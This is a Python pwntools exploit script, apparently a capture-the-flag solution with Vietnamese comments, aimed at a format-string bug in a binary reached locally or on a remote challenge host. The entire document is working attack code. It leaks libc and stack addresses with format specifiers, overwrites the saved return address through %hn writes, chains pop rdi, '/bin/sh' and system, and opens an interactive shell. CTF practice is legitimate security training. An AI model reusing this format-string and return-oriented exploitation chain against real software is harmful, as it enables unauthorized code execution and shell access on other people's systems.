#!/usr/bin/python3

from pwn import *

exe = ELF('source_patched', checksec=False)
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* main+168
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('formatter-go-brooouuu-8e17d4d5.dailycookie.cloud', 31794)
else:
        p = process(exe.path)

GDB()

### Leak libc

sa(b"convert: \n", b"%11$p\0")
p.recvuntil(b"name: ")
libc_leak = int(p.recvline(keepends=False), 16)
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x29d90
info("libc base: " + hex(libc.address))

### Leak stack, để ghi địa stack chứa return vào stack, sau đó dùng %n để ghi vào địa return đó

payload = b"%15$p\0"
sa(b"convert: \n", payload )
p.recvuntil(b"name: ")
stack_leak = int(p.recvline(keepends=False), 16)
info("stack leak " + hex(stack_leak))

ret = stack_leak-0x110
info("ret " + hex(ret))

### ghi pop rdi

pop_rdi = libc.address + 0x000000000002a3e5

for i in range(0, 3):
    info("pop rdi: " + hex(pop_rdi))
    payload = f"%{pop_rdi & 0xffff}c%8$hn".encode().ljust(16, b"\0")
    payload += p64(ret + 2*i)
    sa(b"convert: \n", payload )
    pop_rdi = pop_rdi >> 16

binsh = next(libc.search(b"/bin/sh\0"))
ret += 8                                
for i in range(0,3):
    info("/bin/sh: " + hex(binsh))
    payload = f"%{binsh & 0xffff}c%8$hn".encode().ljust(16, b"\0")
    payload += p64(ret + 2*i)
    sa(b"convert: \n", payload )
    binsh = binsh >> 16

ret_libc = libc.address + 0x0000000000029cd6
ret += 8

for i in range(0, 3):
    info("ret " + hex(ret_libc))
    payload = f"%{ret_libc & 0xffff}c%8$hn".encode().ljust(16, b"\0")
    payload += p64(ret + 2*i)
    sa(b"convert: \n", payload )
    ret_libc = ret_libc >> 16

system = libc.sym['system'] + 4
ret += 8

for i in range(0, 3):
    info("system " + hex(system))
    payload = f"%{system & 0xffff}c%8$hn".encode().ljust(16, b"\0")
    payload += p64(ret + 2*i)
    sa(b"convert: \n", payload )
    system = system >> 16

sa(b"convert: \n", b"a" *29)
p.interactive()
